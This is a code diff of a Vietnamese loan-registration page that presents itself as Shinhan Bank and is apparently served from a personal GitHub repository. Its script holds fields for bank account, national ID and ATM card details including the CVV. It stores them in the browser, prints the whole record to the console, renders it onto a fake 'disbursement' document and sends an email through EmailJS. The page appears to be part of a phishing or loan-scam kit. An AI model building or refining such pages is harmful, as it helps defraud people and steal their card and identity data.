@@ -189,63 +189,75 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with the correct User ID from scripts.js
+        // Initialize EmailJS with the correct User ID
         (function(){
             emailjs.init("OrBsI926QI2_xBh1f");
         })();
 
         // Placeholder user data
-        const userData = {
-            accountNumber: "1234567890",
-            fullName: "Nguyễn Văn A",
-            bankName: "Shinhan Bank",
-            idNumber: "123456789",
-            idIssueDate: "01/01/2020",
-            idIssuePlace: "Hà Nội",
-            loanCode: "SHB123456",
-            loanAmount: 100000000,
-            registrationDate: "08/05/2025",
-            email: "nguyenvana@example.com",
+        let userData = {
+            accountNumber: "",
+            fullName: "",
+            bankName: "",
+            idNumber: "",
+            idIssueDate: "",
+            idIssuePlace: "",
+            loanCode: "",
+            loanAmount: "",
+            registrationDate: "",
+            email: "",
             atmCard: {
-                cardNumber: "1234567890123456",
-                cardHolderName: "Nguyễn Văn A",
-                issueDate: "01/22",
-                expiryDate: "01/25",
-                cvv: "123"
+                cardNumber: "",
+                cardHolderName: "",
+                issueDate: "",
+                expiryDate: "",
+                cvv: ""
             },
             currentStep: 9
         };
 
         // Format number to VND
         function formatNumber(number) {
-            return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+            if (!number) return "";
+            return Number(number).toLocaleString('vi-VN');
         }
 
         // Save to localStorage
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                localStorage.setItem('userData', JSON.stringify(userData));
+                console.log('Saved userData to localStorage:', userData);
+            } catch (error) {
+                console.error('Error saving userData to localStorage:', error);
+            }
         }
 
         // Load user data
         function loadUserData() {
-            const storedData = localStorage.getItem('userData');
-            if (storedData) {
-                Object.assign(userData, JSON.parse(storedData));
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(storedData);
+                    console.log('Loaded userData from localStorage:', userData);
+                } else {
+                    console.warn('No userData found in localStorage, using default.');
+                }
+            } catch (error) {
+                console.error('Error parsing userData from localStorage:', error);
             }
         }
 
-        // Define text fields for canvas (updated for 2480px x 3508px, 300 DPI)
+        // Define text fields for canvas (adjusted for 2480px x 3508px, 300 DPI)
         const canvasFields = [
-            { label: "", value: userData.loanCode, x: 414, y: 127, font: "58px Arial bold", color: "#000000" },
-            { label: "", value: userData.accountNumber, x: 846, y: 643, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName, x: 857, y: 707, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.bankName, x: 846, y: 780, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.fullName, x: 857, y: 887, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.idNumber, x: 846, y: 974, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.idIssueDate, x: 1413, y: 974, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.idIssuePlace, x: 1904, y: 974, font: "50px Arial bold", color: "#000000" },
-            { label: "", value: userData.loanCode, x: 414, y: 193, font: "58px Arial bold", color: "#000000" },
-            // Adding fields from step3.html (atmCard)
+            { label: "", value: userData.loanCode || "", x: 414, y: 127, font: "58px Arial bold", color: "#000000" },
+            { label: "", value: userData.accountNumber || "", x: 846, y: 643, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.fullName || "", x: 857, y: 707, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.bankName || "", x: 846, y: 780, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.fullName || "", x: 857, y: 887, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.idNumber || "", x: 846, y: 974, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.idIssueDate || "", x: 1413, y: 974, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.idIssuePlace || "", x: 1904, y: 974, font: "50px Arial bold", color: "#000000" },
+            { label: "", value: userData.loanCode || "", x: 414, y: 193, font: "58px Arial bold", color: "#000000" },
             { label: "", value: userData.atmCard?.cardNumber || "", x: 846, y: 1034, font: "50px Arial bold", color: "#000000" },
             { label: "", value: userData.atmCard?.cardHolderName || "", x: 846, y: 1094, font: "50px Arial bold", color: "#000000" }
         ];
@@ -263,12 +275,13 @@
                 canvas.height = 3508;
                 ctx.drawImage(img, 0, 0, 2480, 3508);
                 canvasFields.forEach(field => {
-                    if ((field.value || field.label) && field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
+                    const value = field.value || "";
+                    if (field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                         ctx.font = field.font;
                         ctx.fillStyle = field.color;
-                        ctx.fillText(field.value || field.label, field.x, field.y);
-                    } else if (field.x >= canvas.width || field.y >= canvas.height) {
-                        console.warn(`Invalid coordinates for field: ${field.value || field.label} at (${field.x}, ${field.y})`);
+                        ctx.fillText(value, field.x, field.y);
+                    } else {
+                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                     }
                 });
             };
@@ -296,6 +309,7 @@
         // Load user data and populate fields
         window.onload = function() {
             loadUserData();
+            console.log('Rendering canvas with userData:', userData);
             renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png');
         };
 
@@ -315,7 +329,7 @@
                 to_email: userData.email || 'support@shinhan.com.vn'
             };
             emailjs.send('service_60tgxof', 'template_uhyb8ve', params).then(() => {
-                alert("Thông báo hoàn tất đăng ký đã được gửi qua email cho quý khách !");
+                alert("Thông báo hoàn tất đăng ký đã được gửi qua email cho quý khách!");
                 userData.isRegistered = true;
                 userData.isCompleted = true;
                 userData.currentStep = 10;
